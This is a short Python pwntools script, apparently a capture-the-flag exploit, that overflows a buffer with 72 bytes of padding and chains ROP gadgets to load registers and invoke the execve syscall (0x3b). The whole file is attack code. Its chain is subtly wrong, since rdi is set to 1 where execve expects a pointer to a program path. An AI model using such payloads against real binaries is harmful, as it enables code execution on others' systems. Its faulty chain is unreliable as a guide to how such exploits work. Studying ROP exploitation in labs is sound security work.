from pwn import *

context.log_level = 'info'

#Gadgets#
poprdi = 0x0000000000401766
poprsi = 0x000000000040773e
poprdx = 0x000000000043e025
poprax = 0x000000000043eb8c
syscall = 0x000000000040120f

#Payload#
payload = ""
payload += cyclic(72)
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(poprax)
payload += p64(0x3b)
payload += p64(syscall)

print payload